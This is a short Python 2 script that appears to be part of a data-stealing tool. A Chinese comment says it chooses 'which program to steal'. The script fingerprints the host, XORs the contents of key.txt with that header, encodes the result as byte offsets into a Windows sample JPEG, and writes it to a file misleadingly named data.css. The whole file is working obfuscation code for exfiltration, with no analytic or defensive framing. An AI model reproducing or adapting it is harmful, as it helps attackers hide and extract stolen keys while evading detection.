# -*- coding: cp936 -*-
import platform
import os
import hashlib

sourceid=10080

def readfile(filename):
    fobject=open(filename,"rb")
    totalfile=""
    while 1:
        line = fobject.readline()
        if not line:
            fobject.close()
            return totalfile
        totalfile=totalfile+line

def getversion():
    return platform.version()

def getvbit():
    return platform.architecture()[0]

def getpid():
    return os.getpid()

def getuid(chose):#指定偷窃什么程序
    if chose==1:
        return sourceid+6
    if chose==2:
        return sourceid+7
    if chose==3:
        return sourceid+8
    else:
        return sourceid+9

def gettoken(src):
    mt=hashlib.md5()
    mt.update(src)
    return mt.hexdigest()


#组合数据包头部
def headmaker(uid):
    version=getversion()
    vbit=getvbit()
    uid=getuid(uid)
    pid=getpid()
    token=gettoken(str(uid)+str(pid))
    result=version+vbit[:2]+str(uid)+str(pid)+token
    result=result.replace(".","")
    return result
def makepack(uid):
    header=headmaker(uid)
    while len(header)<50:
        header=header+'8'
    result=''
    j=0
    for i in readfile("key.txt"):
        if j<50:
            result=result+str(ord(i)^ord(header[j]))
        else:
            j=0
            result=result+str(ord(i)^ord(header[j]))
        j=j+1

    img=readfile("C:\\Users\\Public\\Pictures\\Sample Pictures\\Desert.jpg")
    data2send=''
    for k in result:
        for p in range(len(img)):
            if ord(k)==ord(img[p]):
                data2send=data2send+chr(p)
                break    
    fw=open("data.css","wb")
    fw.write(data2send)
    fw.close()

